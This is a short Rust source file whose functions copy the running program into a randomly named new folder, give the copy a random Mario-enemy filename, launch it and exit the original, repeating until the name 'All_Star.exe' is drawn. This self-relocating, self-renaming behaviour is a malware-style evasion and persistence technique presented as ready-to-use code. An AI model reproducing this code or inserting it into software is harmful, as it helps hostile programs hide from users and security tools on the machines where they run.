use rand::Rng;
use std::ffi::OsStr;
use rand::distributions::{Alphanumeric, DistString};

pub fn auto_spawn(exe_path: &str){
    let exe_in = std::env::current_exe().unwrap();
    // set new
    let exe_out = std::path::PathBuf::from(exe_path);
    // create all the missing folder
    let create_path_result = std::fs::create_dir_all(exe_out.clone().parent().unwrap());

    match create_path_result{
        Err(_) => {},
        Ok(_) => {
            let create_path_result = std::fs::copy(exe_in, exe_out.clone());
            match create_path_result{
                Err(_) => {},
                Ok(_) => {
                    let _child = std::process::Command::new(exe_path)
                        .spawn()
                        .expect("failed to execute process");
                    std::process::exit(0);
                }
            }
        }
    }
}

pub fn jump_man(){
    let start_exe = std::env::current_exe().unwrap();
    let binding = start_exe.clone();
    let folder_exe = binding.parent().unwrap();
    let name_exe = start_exe.file_name().unwrap();
    let name_exe_string = name_exe.to_str().unwrap().to_string();

    if name_exe_string == "All_Star.exe"{
        return();
    }

    let mut rng = rand::thread_rng();
    let mario_world = vec![
        "Little_Goombas.exe",
        "Koopa_Troopas.exe",
        "Buzzy_Beetles.exe",
        "Koopa_Paratroopas.exe",
        "Bullet_Bills.exe",
        "Hammer_Brothers.exe",
        "Cheep_cheeps.exe",
        "All_Star.exe"
        ];

    let random_string_index: usize = rng.gen_range(0..mario_world.len());
    let enemies  = mario_world[random_string_index];
    let new_folder = Alphanumeric.sample_string(&mut rand::thread_rng(), 8);
    let binding = folder_exe.join(new_folder).join(enemies);
    let out_exe = binding.to_str().unwrap();
    auto_spawn(out_exe);
}